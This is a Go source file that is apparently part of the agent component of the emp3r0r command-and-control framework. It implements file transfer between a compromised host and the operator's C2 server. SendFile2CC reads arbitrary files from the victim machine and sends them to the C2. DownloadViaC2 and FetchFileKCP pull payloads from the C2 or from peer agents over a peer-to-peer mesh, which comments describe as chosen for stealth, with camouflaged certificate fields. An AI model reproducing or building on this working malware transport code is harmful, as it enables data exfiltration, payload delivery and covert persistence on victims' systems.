package c2transport

import (
	"bytes"
	"compress/gzip"
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/cavaliergopher/grab/v3"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// FetchFile download via grab, if path is empty, return []byte instead
// This will try to download from other agents for better speed and stealth
// when fail, will try to download from CC
func FetchFile(config *def.Config, download_addr, file_to_download, path, checksum string) (data []byte, err error) {
	if util.IsFileExist(path) {
		// check checksum
		data, err = util.ReadFileAgent(path)
		if err == nil {
			if crypto.SHA256SumRaw(data) == checksum {
				logging.Infof("FetchFile: %s already exists and checksum matches", path)
				return data, err
			}
		}
	}

	// if download_host is given, download from the specified agent
	if download_addr != "" {
		// download from other agent
		logging.Infof("FetchFile: downloading from %s", download_addr)
		err = FetchFileKCP(download_addr, file_to_download, path, checksum)
		if util.IsFileExist(path) {
			// checksum
			data, err = util.ReadFileAgent(path)
			if err == nil && crypto.SHA256SumRaw(data) == checksum {
				logging.Infof("FetchFile: %s downloaded via TCP and checksum matches", path)
			}
		}
		return nil, err
	}

	return DownloadViaC2(config, file_to_download, path, checksum)
}

// DownloadViaC2 download via EmpHTTPClient
// if path is empty, return []data instead
func DownloadViaC2(config *def.Config, file_to_download, path, checksum string) (data []byte, err error) {
	// The download URL carries the filename as a query param for the server to serve.
	// Routing is done via CBOR MsgAuth capability "www" — not URL path.
	downloadURL := def.CCAddress + "?file_to_download=" + url.QueryEscape(file_to_download)
	logging.Infof("DownloadViaCC is downloading from %s", downloadURL)
	retData := false
	if path == "" {
		retData = true
		logging.Infof("No path specified, will return []byte")
	}
	lock := fmt.Sprintf("%s.lock", path)
	if util.IsFileExist(lock) {
		err = fmt.Errorf("%s already being downloaded", downloadURL)
		return data, err
	}

	// create file.lock to prevent racing downloads
	if !retData {
		util.CreateFileAgent(lock)
		defer os.RemoveAll(lock)
	}

	// connect to CC
	conn, _, cancel, err := EstablishC2Connection(def.CCAddress, file_to_download, common.RuntimeConfig.C2Routes.WWW)
	if err != nil {
		err = fmt.Errorf("DownloadViaC2 EstablishC2Connection: %v", err)
		return data, err
	}
	defer cancel()
	defer conn.Close()
	secureConn := transport.NewSecureConn(conn)

	// download to memory
	if retData {
		logging.Infof("Downloading %s to memory", file_to_download)
		data, err = io.ReadAll(secureConn)
		if err != nil {
			err = fmt.Errorf("DownloadViaCC read body: %v", err)
			return nil, err
		}
		if c := crypto.SHA256SumRaw(data); checksum != "" && c != checksum {
			err = fmt.Errorf("DownloadViaCC checksum failed: %s != %s", c, checksum)
			return nil, err
		}
		return data, nil
	}

	// download to file
	logging.Infof("Downloading %s to %s", file_to_download, path)
	f, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o600)
	if err != nil {
		err = fmt.Errorf("DownloadViaC2 create file: %v", err)
		return data, err
	}
	defer f.Close()

	// Use a 1MB buffer to optimize throughput and reduce polling overhead (especially for the http_poll transport)
	copyBuf := make([]byte, 1024*1024)
	_, err = io.CopyBuffer(f, secureConn, copyBuf)
	if err != nil {
		err = fmt.Errorf("DownloadViaC2 io.Copy: %v", err)
		return data, err
	}

	// checksum
	if checksum != "" {
		c := crypto.SHA256SumFile(path)
		if c != checksum {
			err = fmt.Errorf("DownloadViaC2 checksum failed: %s != %s", c, checksum)
			return nil, err
		}
	}

	return nil, nil
}

// SendFile2CC send file to CC, with buffering
// using FTP API
func SendFile2CC(filepath string, offset int64, token string) (err error) {
	logging.Infof("Sending %s to CC, offset=%d", filepath, offset)
	// open and read the target file
	data, err := util.ReadFileAgent(filepath)
	if err != nil {
		err = fmt.Errorf("failed to open %s: %v", filepath, err)
		return err
	}

	if offset > int64(len(data)) {
		err = fmt.Errorf("offset %d > file size %d", offset, len(data))
		return err
	}
	data = data[offset:]

	conn, _, _, err := EstablishC2Connection(def.CCAddress, token, common.RuntimeConfig.C2Routes.FTP)
	logging.Infof("FTP connection to %s token=%s", def.CCAddress, token)
	if err != nil {
		err = fmt.Errorf("connection failed: %v", err)
		return err
	}

	// Create a debug wrapper
	secureConn := transport.NewSecureConn(conn)
	defer secureConn.Close()

	// open compressor
	compressor := gzip.NewWriter(secureConn)
	if err != nil {
		err = fmt.Errorf("failed to open compressor: %v", err)
		return err
	}
	defer compressor.Close()

	// Use a 1MB buffer to optimize throughput and reduce polling overhead (especially for the http_poll transport)
	copyBuf := make([]byte, 1024*1024)
	n, err := io.CopyBuffer(compressor, bytes.NewReader(data), copyBuf)
	if err != nil {
		logging.Infof("failed, %d bytes transfered: %v", n, err)
	}
	return err
}

// AgentFileTransferSessions stores active file transfer sessions between agents
var AgentFileTransferSessions sync.Map

var (
	// FileServer switch
	FileServerCtx    context.Context
	FileServerCancel context.CancelFunc
)

// FileServer hosts files on an HTTP server over P2P mesh transport
func FileServer(port int, ctx context.Context, cancel context.CancelFunc) (err error) {
	defer cancel()

	// start HTTP server on local interface on a random port
	http_port := util.RandInt(10000, 60000)
	listen_addr := fmt.Sprintf("127.0.0.1:%d", http_port)
	http.HandleFunc("/", handleClient)
	server := &http.Server{Addr: listen_addr}

	// start P2P tunnel server using P2P mesh transport that forwards to HTTP server
	portstr := fmt.Sprintf("%d", port)
	go transport.P2PTunServer(listen_addr, portstr, common.RuntimeConfig.Password, def.MagicString, common.RuntimeConfig.P2PTransport, common.RuntimeConfig.CamouflageCertOrg, common.RuntimeConfig.CamouflageCertCN, ctx, cancel)

	go func() {
		defer func() {
			if r := recover(); r != nil {
				logging.Errorf("FileServer panic: %v\n%s", r, util.CallStack())
			}
		}()
		<-ctx.Done()
		server.Close()
	}()

	logging.Infof("HTTP secure file server started on port %d using %s P2P transport", port, common.RuntimeConfig.P2PTransport)
	err = server.ListenAndServe()
	if err != nil && err != http.ErrServerClosed {
		return fmt.Errorf("FileServer: failed to start HTTP server: %v", err)
	}
	logging.Infof("FileServer on %d exited", port)
	return nil
}

func handleClient(w http.ResponseWriter, r *http.Request) {
	file_path := r.URL.Query().Get("file_path")
	checksum := r.URL.Query().Get("checksum")

	if file_path == "" {
		http.Error(w, "Invalid file path", http.StatusBadRequest)
		return
	}

	var target_path string

	if strings.HasPrefix(file_path, "mem://") {
		// Memory filesystem path
		if !util.IsFileExist(file_path) {
			http.Error(w, "File not found", http.StatusNotFound)
			return
		}
		target_path = file_path
	} else {
		// Disk file path: enforce strict basename/locality to prevent traversal
		if filepath.IsAbs(file_path) || strings.Contains(file_path, "..") {
			http.Error(w, "Invalid file path", http.StatusBadRequest)
			return
		}
		basename := util.FileBaseName(file_path)
		if basename == "" {
			http.Error(w, "Invalid file path", http.StatusBadRequest)
			return
		}
		safe_path := filepath.Join(os.TempDir(), basename)

		if !util.IsFileExist(safe_path) {
			logging.Infof("handleClient: file %s (%s) does not exist on disk, downloading from C2", safe_path, checksum)
			_, err := DownloadViaC2(common.RuntimeConfig, file_path, safe_path, checksum)
			if err != nil {
				logging.Infof("handleClient: failed to download file from C2: %v", err)
				http.Error(w, "Failed to download file from C2", http.StatusInternalServerError)
				return
			}
		}
		target_path = safe_path
	}

	// Read file content using ReadFileAgent (handles memfs and encrypted storage)
	data, err := util.ReadFileAgent(target_path)
	if err != nil {
		logging.Infof("handleClient: failed to read file %s: %v", target_path, err)
		http.Error(w, "Failed to read file", http.StatusInternalServerError)
		return
	}

	// Serve file content
	http.ServeContent(w, r, util.FileBaseName(target_path), time.Now(), bytes.NewReader(data))
}

// FetchFileKCP requests and downloads a file from a P2P server to a specified path via P2P mesh transport
func FetchFileKCP(address, filepath, path, checksum string) (err error) {
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// start local P2P client tunnel to connect to P2P server then HTTP server
	p2p_listen_port := fmt.Sprintf("%d", util.RandInt(10000, 50000))
	go transport.P2PTunClient(address, p2p_listen_port, common.RuntimeConfig.Password, def.MagicString, common.RuntimeConfig.P2PTransport, common.RuntimeConfig.CamouflageCertOrg, common.RuntimeConfig.CamouflageCertCN, ctx, cancel)

	// wait until port is open
	for !netutil.IsPortOpen("127.0.0.1", p2p_listen_port) {
		logging.Infof("RequestAndDownloadFile: waiting for port %s to open", p2p_listen_port)
		time.Sleep(time.Second)
	}

	// use grab to download to a temporary disk path first
	tempFile := fmt.Sprintf("%s/emp3r0r_dl_%d", os.TempDir(), util.RandInt(10000, 99999))
	defer os.Remove(tempFile)

	client := grab.NewClient()
	req, err := grab.NewRequest(tempFile, fmt.Sprintf("http://127.0.0.1:%s/?file_path=%s&checksum=%s", p2p_listen_port, url.QueryEscape(filepath), url.QueryEscape(checksum)))
	if err != nil {
		return fmt.Errorf("RequestAndDownloadFile: failed to create grab request: %v", err)
	}
	resp := client.Do(req)

	// progress
	t := time.NewTicker(5 * time.Second)
	defer t.Stop()
	for !resp.IsComplete() {
		select {
		case <-resp.Done:
			err = resp.Err()
			if err != nil {
				return fmt.Errorf("RequestAndDownloadFile: download finished with error: %v", err)
			}

			// if checksum is given, check it
			if checksum != "" {
				if checksum != crypto.SHA256SumFile(tempFile) {
					return fmt.Errorf("RequestAndDownloadFile: checksum failed: %s != %s", crypto.SHA256SumFile(tempFile), checksum)
				}
			}

			// Read downloaded data from temp file
			data, err := os.ReadFile(tempFile)
			if err != nil {
				return fmt.Errorf("RequestAndDownloadFile read downloaded bytes: %v", err)
			}

			// Save via WriteFileAgent to support mem:/// and encrypted disk storage
			err = util.WriteFileAgent(path, data, 0o600)
			if err != nil {
				return fmt.Errorf("RequestAndDownloadFile write via WriteFileAgent: %v", err)
			}

			logging.Infof("RequestAndDownloadFile: saved %s to %s (%d bytes)", filepath, path, len(data))
			return nil
		case <-t.C:
			logging.Infof("%.02f%% complete at %.02f KB/s", resp.Progress()*100, resp.BytesPerSecond()/1024)
		}
	}

	return nil
}

// CancelFileTransfer cancels an ongoing file transfer session
func CancelFileTransfer(clientAddr, filepath string) {
	sessionID := fmt.Sprintf("%s:%s", clientAddr, filepath)

	if val, exists := AgentFileTransferSessions.Load(sessionID); exists {
		cancel := val.(context.CancelFunc)
		cancel()
		logging.Infof("File transfer session for %s canceled", sessionID)
		AgentFileTransferSessions.Delete(sessionID)
	} else {
		logging.Infof("No active file transfer session for %s", sessionID)
	}
}
